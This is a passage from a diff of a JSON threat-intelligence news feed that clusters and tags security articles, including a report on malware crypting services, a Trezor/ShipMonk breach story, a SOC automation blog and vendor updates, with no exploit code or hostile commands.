can create friction between security and development teams How autonomous WebApp pentesting validates what is actually exploitable How attack-path evidence helps teams understand compounded cloud risk Why route-level proof can make application security findings easier for developers to act on How continuous testing fits an AWS-heavy, cloud-native operating model How security teams can move from interpreting scanner noise to reviewing verifiable evidence Why autonomous pentesting can create a shared view of risk across security and engineering Why It Matters Cloud-native environments change quickly. Applications evolve, infrastructure shifts, identities connect systems, and customer-facing services remain directly tied to the business. For lean security teams responsible for cloud, infrastructure, AppSec, privacy, and compliance, identifying another potential vulnerability isn’t enough. They need to know whether it can actually be exploited and give developers evidence that makes the path to remediation clear. This organization moved beyond periodic reports toward continuous, evidence-driven validation. After about a dozen early NodeZero tests, the team expanded to nearly 30 autonomous WebApp pentesting campaigns across more than 20 applications, creating a more practical way for security and engineering to understand and act on real risk. Download the customer story to see how a cloud-native technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers verifiable evidence they could act on. Download the customer story How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {
+            "AWS": "mention"
+          },
+          "weak_tags": {
+            "products": [
+              [
+                "AWS",
+                "mention",
+                0.25
+              ]
+            ]
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Horizon3 Attack Research",
+          "cohort": "offensive_vulnerability_research",
+          "title": "From Scanner Findings to Verifiable Web Application Risk",
+          "link": "https://horizon3.ai/customer-story/cloud-native-webapp-security-validation/",
+          "published": "2026-08-11T17:07:51+00:00",
+          "summary": "See how a cloud-native merchandise returns technology provider used NodeZero WebApp to continuously validate exploitable risk and give developers evidence they could act on.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {
+              "AWS": "mention"
+            },
+            "weak_tags": {
+              "products": [
+                [
+                  "AWS",
+                  "mention",
+                  0.25
+                ]
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "44f04ecb50",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Recorded Future",
+        "cohort": "threat_research_primary",
+        "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
+        "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
+        "published": "2026-08-13T00:00:00+00:00",
+        "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
+        "full_body": "Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Recorded Future",
+          "cohort": "threat_research_primary",
+          "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
+          "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
+          "published": "2026-08-13T00:00:00+00:00",
+          "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -5870,147 +5994,6 @@
               "ShinyHunters"
             ],
             "affected_industries": [
-              "financial_services"
-            ],
-            "affected_products": [
-              "Google Cloud",
-              "Fortinet",
-              "Apple iOS/macOS"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "no_patch_yet"
-            ],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Google Cloud": "target",
-              "Fortinet": "target",
-              "Apple iOS/macOS": "target",
-              "VMware": "target",
-              "WordPress": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "a06704d870",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion",
-          "supply_chain",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "ShinyHunters"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "healthcare"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Fortinet",
-          "Google Cloud"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "zero_day"
-        ],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "SecurityWeek",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "14,000 Trezor Customers Impacted by Data Breach at ShipMonk",
-        "link": "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/",
-        "published": "2026-08-14T08:16:00+00:00",
-        "summary": "Hackers stole the customers’ shipping information, including names, addresses, email addresses, and phone numbers. The post 14,000 Trezor Customers Impacted by Data Breach at ShipMonk appeared first on SecurityWeek .",
-        "full_body": "Hardware crypto wallet provider Trezor says the personal information of nearly 14,000 people was compromised in a data breach. The incident, it says, did not involve Trezor’s systems but rather its third-party shipping provider, ShipMonk. Trezor was notified of the attack on August 10. Customers in the US, the UK, Sweden, Colombia, Brazil, Italy, and Portugal who placed orders between May 10 and August 8 were affected. “We’re extremely sorry to inform our community that customer personal information, including full names, phone numbers, email addresses, and shipping addresses, has been accessed by an unauthorized actor during this breach,” Trezor says in a notice . Hackers stole the names, addresses, email addresses, and phone numbers of 11,742 customers, as well as the names, cities, and email addresses of 1,947 customers. Trezor shared the information with ShipMonk for order delivery purposes. “The breach is limited due to Trezor’s strict 90-day data storage policy (we were also able to negotiate the same terms with fulfillment partners, who follow the same policy),” the company says, but notes that for the 1,947 customers with partial exposure, older orders might have been accessed as well. Advertisement. Scroll to continue reading. “To be clear, our systems were not compromised, and your Trezor device is secure, but the affected customers might be targeted by more sophisticated phishing attempts,” the company says. Trezor notified all impacted customers via email and advised them to be wary of suspicious communication that requests personal information or prompts for immediate action. The company says it is in direct contact with ShipMonk to establish an exact timeline of events and determine the full scope of the data breach. ShipMonk reportedly notified customers that hackers accessed customer data by exploiting a vulnerability in Metabase. The targeted bug is likely the SQL injection zero-day that Metabase patched last week. The notorious extortion group ShinyHunters claimed responsibility for an attack on Metabase. On Wednesday, the group leaked data allegedly stolen from the data analytics solutions provider. ShipMonk has yet to acknowledge the incident publicly. It is unclear how many companies might have been affected, whether other individuals’ personal information was stolen, and who was behind the attack. SecurityWeek has emailed ShipMonk for a statement on the data breach and will update this article if the company responds. Related: Ceva Logistics Operations Disrupted by Cyberattack Related: Corporate Data Stolen in Levi Strauss Cyberattack Related: 3.8 Million Impacted by Unlimited Technology Systems Data Breach Related: 311,000 Impacted by Brown Health Medical Group-MA Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Adobe Commerce Bug Targeted Immediately After Disclosure WordPress 7.0.4 Patches Remote Code Execution Vulnerability Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Critical VMware vCenter Vulnerability in Attackers’ Crosshairs Nightmare Eclipse Drops Windows Zero-Day Exploit ‘ShieldBreak’ Mindgard Raises $30 Million to Protect AI Systems Ceva Logistics Operations Disrupted by Cyberattack Over 2,500 Organizations Impacted by LiteLLM Supply Chain Attack Latest News In Other News: Rapid7 Layoffs, Hacking a Boeing 737, Refrigeration System Vulnerabilities Trivy, Not LiteLLM Behind the 2,500 Org Compromise Google Cloud Sets Out Post-Quantum Roadmap With 2029 Readiness Goal 1.6 Million Likely Impacted by RingCentral Data Breach Over 1,000 Charities Hit by Beacon CRM Data Breach Hackers Exploiting Unpatched GeoServer Zero-Day AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Cybersecurity M&A Roundup: 21 Deals Announced in July 2026 Trending Daily Briefi",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain",
-            "phishing_social_eng",
-            "zero_day",
-            "data_breach"
-          ],
-          "actor_attribution": [
-            "ShinyHunters"
-          ],
-          "affected_industries": [
-            "healthcare",
-            "financial_services"
-          ],
-          "affected_products": [
-            "Google Cloud",
-            "Fortinet",
-            "Apple iOS/macOS"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "no_patch_yet"
-          ],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Google Cloud": "target",
-            "Fortinet": "target",
-            "Apple iOS/macOS": "target",
-            "VMware": "target",
-            "WordPress": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "SecurityWeek",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "14,000 Trezor Customers Impacted by Data Breach at ShipMonk",
-          "link": "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/",
-          "published": "2026-08-14T08:16:00+00:00",
-          "summary": "Hackers stole the customers’ shipping information, including names, addresses, email addresses, and phone numbers. The post 14,000 Trezor Customers Impacted by Data Breach at ShipMonk appeared first on SecurityWeek .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain",
-              "phishing_social_eng",
-              "zero_day",
-              "data_breach"
-            ],
-            "actor_attribution": [
-              "ShinyHunters"
-            ],
-            "affected_industries": [
-              "healthcare",
               "financial_services"
             ],
             "affected_products": [
@@ -7017,20 +7000,16 @@
       ]
     },
     {
-      "cluster_id": "ab440398cd",
+      "cluster_id": "d9b31e75a7",
       "priority_score": 9,
       "member_count": 1,
       "corroborating_source_count": 1,
-      "strong_signals": [
-        "Google Cloud"
-      ],
+      "strong_signals": [],
       "taxonomy": {
         "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [
-          "Google Cloud"
-        ],
+        "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
@@ -7043,30 +7022,26 @@
         ]
       },
       "primary": {
-        "source": "Google Cloud Security",
+        "source": "Orca Security Research",
         "cohort": "cloud_identity_infrastructure",
-        "title": "What’s new with Google Cloud",
-        "link": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
-        "published": "2026-08-14T16:00:00+00:00",
-        "summary": "Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem",
-        "full_body": "Inside Google Cloud What’s new with Google Cloud August 14, 2026 Google Cloud Content & Editorial Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gemini 3.5 and Google Cloud. Compete for your share of $190,000 in prizes, cash, and Google Cloud credits! Submissions are open from August 3, 2026, to August 31, 2026. Learn more and register . Sign up for GEAR to get exclusive updates and your badge. #AllThingsAgenticHackathon Accelerate PostgreSQL migrations using Gemini in Database Migration Service Enterprise database migrations often stall during the \"last mile\" of translating legacy stored procedures, triggers, and custom functions from Oracle or SQL Server. Database Migration Service (DMS) now provides AI-assisted code conversion powered by Gemini in Databases. By combining deterministic compiler rules for 1:1 syntax with Gemini contextual synthesis for complex procedural blocks, DMS converts legacy code into native PostgreSQL and AlloyDB with full schema awareness and side-by-side validation. Read the full blog post to learn how to streamline your database code conversion. Compute Flex CUDs now available for G2 and G4 GPU VMs Compute Flexible Committed Use Discounts (Flex CUDs) are now available for G2 (NVIDIA L4) and G4 (NVIDIA RTX Pro 6000) VMs . You can now lock in predictable savings while retaining the flexibility to adapt across VM families, migrate between regions, and combine general-purpose compute, GKE, Cloud Run, and G2 & G4 GPU VMs under a single spend commitment. Flex CUDs for G-series VMs let you lock in savings today while preserving the agility to upgrade to latest hardware without disruption! Explore VM instance pricing or learn more about Flex CUDs . Rapid Bucket accelerates the training and checkpoint performance in PyTorch Ecosystem via GCSFS With the release of GCSFS 2026.8.0 , organisations can now unlock maximum ROI from their AI/ML infrastructure by eliminating data starvation on GPUs in PyTorch ecosystem when they are using Frameworks like Dask, Pandas, PyTorch , PyTorch Lightning, Hugging Face Datasets, Ray dataetc. By making adaptive concurrent prefetching the default, GCSFS dynamically predicts and background-fetches sequential read patterns—boosting single-file throughput by 5x, and scaling up to 21 GiB/s , saturating the NIC when paired with Rapid Bucket . Saturating the NIC translates to significantly improved accelerator goodput and reduced training wait times with zero integration friction. Training and checkpoint restore workflows benefit from intelligent memory management that automatically drains the buffer during random reads to completely avoid bandwidth or memory penalties. Aug 3 - Aug 7 Navigate data sovereignty and AI innovation with hybrid cloud For enterprises facing strict compliance rules, keeping sensitive data on-premises often means missing out on cutting-edge AI. Data from the 2026 State of AI Infrastructure report reveals that 52% of IT leaders are adopting hybrid cloud strategies to",
+        "title": "SOC Automation: AI-Driven Tools and Best Practices",
+        "link": "https://orca.security/resources/blog/soc-automation/",
+        "published": "2026-08-14T18:11:14+00:00",
+        "summary": "Key Takeaways SOC automation is the practice of handing a defined security operations task to software that runs it on a stated trigger, under a rule a person wrote. It covers enrichment, deduplication, case creation, evidence collection, and a bounded set of containment actions across the alerts a security operations center receives. The pipeline is […]",
+        "full_body": "Key Takeaways SOC automation hands a defined alert-handling task to software that runs it on a stated trigger, under a rule a person wrote and can read back. The pipeline has five stages, and the one that decides quality is enrichment: an action taken on a thin alert is a faster wrong decision. Reversibility sets the autonomy line. Enrichment, correlation, and case creation run unattended; revoking access or isolating a workload needs a stated bar. NIST SP 800-61r3 puts incident response across all six CSF 2.0 Functions and still recommends manual log review where automation cannot reach. Orca attaches the asset, identity, network path, and data store around every finding, so the trigger arrives carrying the context the decision needs. SOC automation is the practice of handing a defined security operations task to software that runs it on a stated trigger, under a rule a person wrote. It covers enrichment, deduplication, case creation, evidence collection, and a bounded set of containment actions across the alerts a security operations center receives. The pipeline is the useful unit of analysis. An alert arrives, something adds context to it, something decides, something acts, and the outcome feeds back into the rule that fired. Programs stall when teams automate the acting but not the context. That sequence sets the ceiling on everything else. What a platform can read about an alert matters more than how many actions it can fire, and this article treats that as its organizing claim. What Is SOC Automation? SOC automation replaces repeated analyst steps with rules that evaluate triggers and execute defined actions. The security operations center keeps its people, tiers, and escalation paths; automation absorbs the tasks analysts perform consistently across alerts. A task counts as automated when the system can evaluate a trigger, take an action through an API, and record why the rule fired. That record is easy to omit because nothing breaks immediately, but its absence shows up in post-incident review. Detection sits upstream. A SIEM or cloud detection service decides what counts as an alert; automation begins once that alert exists and ends when the case closes. How SOC Automation Works From Trigger to Action Five stages run in order, and each one has a different failure mode. Trigger. A detection rule, a posture finding, or a schedule produces an event the system can match on. Enrichment. The system attaches what the decision needs: which identity, which asset, what that asset reaches, whether it sits on a known attack path , and whether it holds sensitive data. Decision. A rule or a model evaluates the enriched event against a threshold a person set. Action. The system writes a case, changes a finding, notifies an owner, or touches infrastructure. Feedback. The analyst verdict returns to the rule, and someone changes the threshold or the enrichment set. Take one alert through it. An access key authenticates from a region your organization has never used. Enrichment answers four questions: the key’s owner, the roles it can assume, what those roles reach, and whether the account has behaved this way before. The decision weighs those four answers together, and geography alone never carries it. The action revokes the key or opens a case for a named owner. The verdict an analyst records tells you whether the region signal deserved its weight. Cloud providers ship this as a documented primitive with a product name attached. AWS Security Hub CSPM automation rules apply rule actions such as suppressing findings, changing their severity, and adding notes as findings are ingested. Microsoft Sentinel automation rules fire when an incident is created or updated, or when an alert is created. They call a playbook for anything more complex. Where the Pipeline Breaks Enrichment breaks quietly because the pipeline does not stop to wait for it. Microsoft documents the behaviour: when a playbook inside an automation rule runs longer than two",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [
-            "Google Cloud"
-          ],
+          "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
           "confidence_tier": "tier_2_operator",
-          "role_map": {
-            "Google Cloud": "target"
-          },
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -7074,28 +7049,24 @@
       },
       "corroborating_sources": [
         {
-          "source": "Google Cloud Security",
+          "source": "Orca Security Research",
           "cohort": "cloud_identity_infrastructure",
-          "title": "What’s new with Google Cloud",
-          "link": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
-          "published": "2026-08-14T16:00:00+00:00",
-          "summary": "Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem",
+          "title": "SOC Automation: AI-Driven Tools and Best Practices",
+          "link": "https://orca.security/resources/blog/soc-automation/",
+          "published": "2026-08-14T18:11:14+00:00",
+          "summary": "Key Takeaways SOC automation is the practice of handing a defined security operations task to software that runs it on a stated trigger, under a rule a person wrote. It covers enrichment, deduplication, case creation, evidence collection, and a bounded set of containment actions across the alerts a security operations center receives. The pipeline is […]",
           "taxonomy": {
             "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [
-              "Google Cloud"
-            ],
+            "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "Google Cloud": "target"
-            },
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -7239,6 +7210,234 @@
             "role_map": {
               "VMware": "target",
               "npm": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "ab440398cd",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "Google Cloud"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Google Cloud"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Google Cloud Security",
+        "cohort": "cloud_identity_infrastructure",
+        "title": "What’s new with Google Cloud",
+        "link": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
+        "published": "2026-08-14T16:00:00+00:00",
+        "summary": "Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem",
+        "full_body": "Inside Google Cloud What’s new with Google Cloud August 14, 2026 Google Cloud Content & Editorial Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gemini 3.5 and Google Cloud. Compete for your share of $190,000 in prizes, cash, and Google Cloud credits! Submissions are open from August 3, 2026, to August 31, 2026. Learn more and register . Sign up for GEAR to get exclusive updates and your badge. #AllThingsAgenticHackathon Accelerate PostgreSQL migrations using Gemini in Database Migration Service Enterprise database migrations often stall during the \"last mile\" of translating legacy stored procedures, triggers, and custom functions from Oracle or SQL Server. Database Migration Service (DMS) now provides AI-assisted code conversion powered by Gemini in Databases. By combining deterministic compiler rules for 1:1 syntax with Gemini contextual synthesis for complex procedural blocks, DMS converts legacy code into native PostgreSQL and AlloyDB with full schema awareness and side-by-side validation. Read the full blog post to learn how to streamline your database code conversion. Compute Flex CUDs now available for G2 and G4 GPU VMs Compute Flexible Committed Use Discounts (Flex CUDs) are now available for G2 (NVIDIA L4) and G4 (NVIDIA RTX Pro 6000) VMs . You can now lock in predictable savings while retaining the flexibility to adapt across VM families, migrate between regions, and combine general-purpose compute, GKE, Cloud Run, and G2 & G4 GPU VMs under a single spend commitment. Flex CUDs for G-series VMs let you lock in savings today while preserving the agility to upgrade to latest hardware without disruption! Explore VM instance pricing or learn more about Flex CUDs . Rapid Bucket accelerates the training and checkpoint performance in PyTorch Ecosystem via GCSFS With the release of GCSFS 2026.8.0 , organisations can now unlock maximum ROI from their AI/ML infrastructure by eliminating data starvation on GPUs in PyTorch ecosystem when they are using Frameworks like Dask, Pandas, PyTorch , PyTorch Lightning, Hugging Face Datasets, Ray dataetc. By making adaptive concurrent prefetching the default, GCSFS dynamically predicts and background-fetches sequential read patterns—boosting single-file throughput by 5x, and scaling up to 21 GiB/s , saturating the NIC when paired with Rapid Bucket . Saturating the NIC translates to significantly improved accelerator goodput and reduced training wait times with zero integration friction. Training and checkpoint restore workflows benefit from intelligent memory management that automatically drains the buffer during random reads to completely avoid bandwidth or memory penalties. Aug 3 - Aug 7 Navigate data sovereignty and AI innovation with hybrid cloud For enterprises facing strict compliance rules, keeping sensitive data on-premises often means missing out on cutting-edge AI. Data from the 2026 State of AI Infrastructure report reveals that 52% of IT leaders are adopting hybrid cloud strategies to",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Google Cloud"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_2_operator",
+          "role_map": {
+            "Google Cloud": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Google Cloud Security",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "What’s new with Google Cloud",
+          "link": "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
+          "published": "2026-08-14T16:00:00+00:00",
+          "summary": "Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Google Cloud"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Google Cloud": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "a06704d870",
+      "priority_score": 9,
